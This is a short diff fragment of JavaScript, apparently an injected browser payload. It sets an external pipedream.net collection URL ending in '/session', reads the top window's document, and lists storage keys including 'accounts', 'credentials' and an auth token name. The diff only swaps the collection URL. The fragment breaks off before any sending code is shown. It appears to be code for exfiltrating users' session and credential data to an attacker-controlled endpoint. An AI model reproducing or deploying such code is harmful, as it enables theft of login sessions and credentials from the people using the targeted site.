@@ -6,7 +6,7 @@ window.addEventListener('beforeunload', (e) => {
 
 (async function ex() {
 
-	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
+	const url = 'https://0733573e51e539943f1a251895a65a69.m.pipedream.net/session';
 	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
 	const keys = [
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
